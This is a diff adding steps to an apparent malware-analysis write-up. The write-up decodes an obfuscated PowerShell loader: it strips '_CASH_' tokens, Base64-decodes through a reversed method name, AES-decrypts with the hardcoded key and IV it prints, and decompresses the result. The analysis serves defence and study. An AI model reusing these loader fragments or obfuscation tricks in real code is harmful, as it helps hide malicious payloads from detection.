@@ -82,3 +82,26 @@ A command is executed, with the reversed string of "ReadAllText" and it reads th
 foreach ($_CASH_ealtD in $_CASH_JPyoO) { if ($_CASH_ealtD.StartsWith(':: @')) {  $_CASH_tFaoL = $_CASH_ealtD.Substring(4)
 ```
 From the initial script, it is looking for instances that start with ":: @" and takes everything from the 4th substring onwards, ie, all the content after the "::@"
+The result is being saved as variable name "_CASH_tFaoL"
+```powershell
+$_CASH_tFaoL = [System.Text.RegularExpressions.Regex]::Replace($_CASH_tFaoL, '_CASH_', '')
+```
+The contents of _CASH_tFaoL is read, and all instances of "_CASH_" are replaced with nothing.
+```powershell
+$_CASH_epUJg = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')($_CASH_tFaoL)
+```
+The string is decoded from Base64.
+```powershell
+$_CASH_pFavC = New-Object System.Security.Cryptography.AesManaged
+$_CASH_pFavC.Mode = [System.Security.Cryptography.CipherMode]::CBC
+$_CASH_pFavC.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+$_CASH_pFavC.Key = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=')
+$_CASH_pFavC.IV = [System.Convert]::('gnirtS46esaBmorF'[-1..-16] -join '')('5IgM8xAuhLV8mV1KzrCEvg==')
+```
+The decoded text is being AES-decrypted with Key "GZ+NDDfWJdUL46CgERFNsma8kH1a1NyOqIvOPvKsrWA=" and IV "5IgM8xAuhLV8mV1KzrCEvg==".
+```powershell
+$_CASH_SjOoQ = New-Object System.IO.MemoryStream(, $_CASH_epUJg)
+$_CASH_DLltN = New-Object System.IO.MemoryStream
+$_CASH_VzeZp = New-Object System.IO.Compression.GZipStream($_CASH_SjOoQ, [IO.Compression.CompressionMode]::Decompress)
+```
+The decrypted text is being decompressed with gunzip.
